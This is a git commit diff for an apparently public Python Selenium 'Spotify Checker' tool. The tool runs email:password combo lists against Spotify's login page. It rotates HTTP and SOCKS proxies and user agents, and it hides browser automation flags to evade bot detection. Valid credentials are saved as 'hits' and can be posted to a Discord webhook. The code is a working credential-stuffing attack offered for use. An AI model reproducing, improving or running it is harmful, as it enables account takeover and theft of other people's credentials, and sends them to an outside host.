28bfc29dec14d5011fc35b0a7bc931403643d612
onemanbuilds <72015638+onemanbuilds@users.noreply.github.com>
2021-01-19 15:47:50 +0100

    update
    - Added webhook support.
    - Added webhook retries to the title.
    - Removed some useragents.
    - Changed file orders.
    - Added socks4 & socks5 proxy support.
    - Added webhook proxy support.
    - Added more logs (now you can see more information in the console).
    - Added close_driver method to close the webdriver with a message.
    - Added config.json, you don't need to enter your settings everytime you run the app anymore.
    - Changed print colors.

--- main.py
+++ main.py
@@ -4,7 +4,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
-from selenium.common.exceptions import TimeoutException
+from selenium.common.exceptions import TimeoutException,WebDriverException
 from time import sleep
 from concurrent.futures import ThreadPoolExecutor
 from colorama import init,Style,Fore
@@ -12,6 +12,9 @@ from os import name,system
 from random import choice
 from threading import Thread,Lock
 from sys import stdout
+from datetime import datetime
+import json
+import requests
 
 class Main:
     def clear(self):
@@ -22,12 +25,17 @@ class Main:
         else:
             print("\n") * 120
 
-    def SetTitle(self,title_name:str):
-        system("title {0}".format(title_name))
+    def SetTitle(self,title:str):
+        if name == 'posix':
+            stdout.write(f"\x1b]2;{title}\x07")
+        elif name in ('ce', 'nt', 'dos'):
+            system(f'title {title}')
+        else:
+            stdout.write(f"\x1b]2;{title}\x07")
 
     def TitleUpdate(self):
         while True:
-            self.SetTitle('One Man Builds Spotify Checker Selenium Tool ^| HITS: {0} ^| BADS: {1} ^| RETRIES: {2}'.format(self.hits,self.bads,self.retries))
+            self.SetTitle(f'[One Man Builds Spotify Checker Selenium Tool] ^| HITS: {self.hits} ^| BADS: {self.bads} ^| WEBHOOK RETRIES: {self.webhook_retries} ^| RETRIES: {self.retries}')
             sleep(0.1)
 
     def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
@@ -38,23 +46,62 @@ class Main:
         self.lock.release()
 
     def GetRandomUserAgent(self):
-        useragents = self.ReadFile('useragents.txt','r')
+        useragents = self.ReadFile('[Data]/useragents.txt','r')
         return choice(useragents)
 
     def GetRandomProxy(self):
-        proxies_file = self.ReadFile('proxies.txt','r')
-        return choice(proxies_file)
+        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
+        if self.proxy_type == 1:
+            return f'http://{choice(proxies_file)}'
+        elif self.proxy_type == 2:
+            return f'socks4://{choice(proxies_file)}'
+        elif self.proxy_type == 3:
+            return f'socks5://{choice(proxies_file)}'
+
+    def GetRandomProxyForWebhook(self):
+        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
+        proxies = {}
+        if self.proxy_type == 1:
+            proxies = {
+                "http":"http://{0}".format(choice(proxies_file)),
+                "https":"https://{0}".format(choice(proxies_file))
+            }
+        elif self.proxy_type == 2:
+            proxies = {
+                "http":"socks4://{0}".format(choice(proxies_file)),
+                "https":"socks4://{0}".format(choice(proxies_file))
+            }
+        else:
+            proxies = {
+                "http":"socks5://{0}".format(choice(proxies_file)),
+                "https":"socks5://{0}".format(choice(proxies_file))
+            }
+        return proxies
+
+    def ReadJson(self,filename,method):
+        with open(filename,method) as f:
+            return json.load(f)
+
+    def ReadFile(self,filename,method):
+        with open(filename,method,encoding='utf8') as f:
+            content = [line.strip('\n') for line in f]
+            return content
+
+    def close_driver(self,method_name,driver):
+        self.PrintText(Fore.WHITE,Fore.YELLOW,method_name,'CLOSING WEBDRIVER')
+        driver.quit()
 
     def __init__(self):
+        self.SetTitle('[One Man Builds Spotify Checker Selenium Tool]')
         self.clear()
-        self.SetTitle('One Man Builds Spotify Checker Selenium Tool')
         init(convert=True)
         self.lock = Lock()
         self.hits = 0
         self.bads = 0
         self.retries = 0
+        self.webhook_retries = 0
 
-        title = Style.BRIGHT+Fore.RED+"""
+        self.title = Style.BRIGHT+Fore.GREEN+"""
                                  ╔══════════════════════════════════════════════════╗
                                       ╔═╗╔═╗╔═╗╔╦╗╦╔═╗╦ ╦  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                       ╚═╗╠═╝║ ║ ║ ║╠╣ ╚╦╝  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
@@ -63,25 +110,64 @@ class Main:
 
 
         """
-        print(title)
-        self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
-        self.headless = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Headless ['+Fore.RED+'0'+Fore.CYAN+']Not Headless: '))
-        self.website_load_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Website Load Max Wait (seconds): '))
-        self.login_check_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Login Check Max Wait (seconds): '))
-        self.wait_before_start = float(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Wait Before Start (seconds): '))
-        self.browser_amount = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))
+        print(self.title)
+
+        config = self.ReadJson('[Data]/configs.json','r')
+
+        self.use_proxy = config['use_proxy']
+        self.proxy_type = config['proxy_type']
+        self.headless = config['headless']
+        self.website_load_max_wait = config['website_load_max_wait']
+        self.login_check_max_wait = config['login_check_max_wait']
+        self.wait_before_start = config['wait_before_start']
+        self.browser_amount = config['browser_amount']
+        self.webhook_enable = config['webhook_enable']
+        self.webhook_url = config['webhook_url']
+
         print('')
 
-    def ReadFile(self,filename,method):
-        with open(filename,method,encoding='utf8') as f:
-            content = [line.strip('\n') for line in f]
-            return content
+    def SendWebhook(self,title,message,icon_url,thumbnail_url,proxy,useragent):
+        try:
+            timestamp = str(datetime.utcnow())
 
-    def Login(self,username,password):
+            message_to_send = {"embeds": [{"title": title,"description": message,"color": 65362,"author": {"name": "AUTHOR'S DISCORD SERVER [CLICK HERE]","url": "https://discord.gg/9bHfzyCjPQ","icon_url": icon_url},"footer": {"text": "MADE BY ONEMANBUILDS","icon_url": icon_url},"thumbnail": {"url": thumbnail_url},"timestamp": timestamp}]}
+            
+            headers = {
+                'User-Agent':useragent,
+                'Pragma':'no-cache',
+                'Accept':'*/*',
+                'Content-Type':'application/json'
+            }
+
+            payload = json.dumps(message_to_send)
+
+            if self.use_proxy == 1:
+                response = requests.post(self.webhook_url,data=payload,headers=headers,proxies=proxy)
+            else:
+                response = requests.post(self.webhook_url,data=payload,headers=headers)
+
+            if response.text == "":
+                pass
+            elif "You are being rate limited." in response.text:
+                self.webhook_retries += 1
+                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
+            else:
+                self.webhook_retries += 1
+                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
+        except:
+            self.webhook_retries += 1
+            self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
+
+    def Login(self,email,password):
         try:
             options = Options()
 
-            options.add_argument(f'--user-agent={self.GetRandomUserAgent()}')
+            useragent = self.GetRandomUserAgent()
+
+            if self.headless == 1:
+                options.add_argument('--headless')
+
+            options.add_argument(f'--user-agent={useragent}')
             options.add_argument('--no-sandbox')
             options.add_argument('--log-level=3')
             options.add_argument('--lang=en')
@@ -89,53 +175,57 @@ class Main:
             if self.use_proxy == 1:
                 options.add_argument('--proxy-server=http://{0}'.format(self.GetRandomProxy()))
 
-            if self.headless == 1:
-                options.add_argument('--headless')
-
-            #Removes navigator.webdriver flag
             options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
-            
-            # For older ChromeDriver under version 79.0.3945.16
             options.add_experimental_option('useAutomationExtension', False)
-
             options.add_argument("window-size=1280,800")
-
-            #For ChromeDriver version 79.0.3945.16 or over
             options.add_argument('--disable-blink-features=AutomationControlled')
+
             driver = webdriver.Chrome(options=options)
 
             driver.get('https://accounts.spotify.com/en/login/')
-            login_username_present = EC.presence_of_element_located((By.ID, 'login-username'))
-            WebDriverWait(driver, self.website_load_max_wait).until(login_username_present)
-
-            username_elem = driver.find_element_by_id('login-username').send_keys(username)
-            password_elem = driver.find_element_by_id('login-password').send_keys(password)
-            login_button_elem = driver.find_element_by_id('login-button').click()
 
             try:
-                url_to_be_present = EC.url_to_be('https://accounts.spotify.com/en/status')
-                WebDriverWait(driver, self.login_check_max_wait).until(url_to_be_present)
-                self.PrintText(Fore.CYAN,Fore.RED,'HIT',f'{username}:{password}')
-                with open('hits.txt','a',encoding='utf8') as f:
-                    f.write(f'{username}:{password}\n')
-                self.hits += 1
+                WebDriverWait(driver,self.website_load_max_wait).until(EC.visibility_of_element_located((By.ID,'login-username'))).send_keys(email)
+                try:
+                    WebDriverWait(driver,self.website_load_max_wait).until(EC.visibility_of_element_located((By.ID,'login-password'))).send_keys(password)
+                    try:
+                        WebDriverWait(driver,self.website_load_max_wait).until(EC.element_to_be_clickable((By.ID,'login-button'))).click()
+                        try:
+                            url_to_be_present = EC.url_contains('https://accounts.spotify.com/en/status')
+                            WebDriverWait(driver, self.login_check_max_wait).until(url_to_be_present)
+                            self.PrintText(Fore.WHITE,Fore.GREEN,'HIT',f'{email}:{password}')
+                            with open('[Data]/[Results]/hits.txt','a',encoding='utf8') as f:
+                                f.write(f'{email}:{password}\n')
+                            self.hits += 1
+                            if self.webhook_enable == 1:
+                                self.SendWebhook('Spotify Account',f'{email}:{password}','https://cdn.discordapp.com/attachments/776819723731206164/796935218166497352/onemanbuilds_new_logo_final.png','https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/768px-Spotify_logo_without_text.svg.png',self.GetRandomProxyForWebhook(),useragent)
+                        except TimeoutException:
+                            self.PrintText(Fore.WHITE,Fore.RED,'BAD',f'{email}:{password}')
+                            with open('[Data]/[Results]/bads.txt','a',encoding='utf8') as f:
+                                f.write(f'{email}:{password}\n')
+                            self.bads += 1
+                    except TimeoutException:
+                        self.retries += 1
+                        self.close_driver('CAN NOT PRESS LOGIN BUTTON',driver)
+                        self.Login(email,password)
+                except TimeoutException:
+                    self.retries += 1
+                    self.close_driver('CAN NOT ENTER PASSWORD',driver)
+                    self.Login(email,password)
             except TimeoutException:
-                self.PrintText(Fore.RED,Fore.CYAN,'BAD',f'{username}:{password}')
-                with open('bads.txt','a',encoding='utf8') as f:
-                    f.write(f'{username}:{password}\n')
-                self.bads += 1
-                
-        except:
+                self.retries += 1
+                self.close_driver('CAN NOT ENTER USERNAME',driver)
+                self.Login(email,password)
+        except WebDriverException:
             self.retries += 1
-            driver.quit()
-            self.Login(username,password)
+            self.close_driver('LOGIN',driver)
+            self.Login(email,password)
         finally:
-            driver.quit()
+            self.close_driver('PROCESS FINISHED',driver)
         
-
     def Start(self):
         Thread(target=self.TitleUpdate).start()
-        combos = self.ReadFile('combos.txt','r')
+        combos = self.ReadFile('[Data]/combos.txt','r')
         with ThreadPoolExecutor(max_workers=self.browser_amount) as ex:
             for combo in combos:
                 username = combo.split(':')[0]
